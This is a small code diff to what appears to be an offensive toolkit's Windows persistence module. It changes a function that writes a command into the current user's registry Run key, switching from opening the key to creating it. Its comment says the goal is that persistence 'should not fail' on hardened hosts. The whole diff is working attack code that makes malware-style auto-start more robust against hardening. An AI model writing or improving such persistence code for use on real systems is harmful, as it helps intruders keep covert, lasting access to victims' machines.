@@ -33,13 +33,15 @@ def _is_windows():
 
 # ---------------------------------------------------------------- windows
 def win_run_key(command, name=TAG) -> dict:
-    """HKCU Run-key persistence. Undo: pass the returned key/name."""
+    """HKCU Run-key persistence. Undo: pass the returned key/name.
+    CreateKeyEx opens-or-creates: the Run key may legitimately be absent
+    (stripped profiles, hardened hosts) — persistence should not fail."""
     try:
         if not _is_windows():
             return {"ok": False, "error": "windows only"}
         import winreg
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
-                            winreg.KEY_SET_VALUE) as k:
+        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
+                                winreg.KEY_SET_VALUE) as k:
             winreg.SetValueEx(k, name, 0, winreg.REG_SZ, command)
         return {"ok": True, "method": "run_key", "hive": "HKCU",
                 "key": RUN_KEY, "name": name, "command": command,
